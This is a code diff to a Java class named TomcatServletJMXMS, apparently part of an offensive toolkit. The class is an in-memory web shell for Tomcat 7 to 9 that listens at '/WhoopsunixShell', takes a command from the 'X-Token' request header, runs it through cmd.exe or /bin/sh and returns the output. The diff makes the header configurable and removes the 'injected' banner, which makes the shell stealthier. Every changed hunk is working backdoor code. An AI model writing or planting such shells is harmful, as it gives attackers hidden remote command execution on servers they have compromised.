@@ -15,9 +15,9 @@ import java.util.Set;
  * Tomcat 7 8 9
  */
 public class TomcatServletJMXMS implements Servlet {
-
-    final private static String NAME = "Whoopsunix";
-    final private static String pattern = "/WhoopsunixShell";
+    private static String NAME = "Whoopsunix";
+    private static String pattern = "/WhoopsunixShell";
+    private static String header = "X-Token";
 
     public TomcatServletJMXMS() {
 
@@ -84,13 +84,12 @@ public class TomcatServletJMXMS implements Servlet {
     public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
         try {
             HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
-            String header = httpServletRequest.getHeader("X-Token");
-            if (header == null) {
+            String cmd = httpServletRequest.getHeader(header);
+            if (cmd == null) {
                 return;
             }
-            String result = exec(header);
+            String result = exec(cmd);
             PrintWriter printWriter = servletResponse.getWriter();
-            printWriter.println("TomcatServletJMXMS injected");
             printWriter.println(result);
         } catch (Exception e) {
 
@@ -110,7 +109,7 @@ public class TomcatServletJMXMS implements Servlet {
     public static String exec(String str) {
         try {
             String[] cmd = null;
-            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
+            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                 cmd = new String[]{"cmd.exe", "/c", str};
             } else {
                 cmd = new String[]{"/bin/sh", "-c", str};
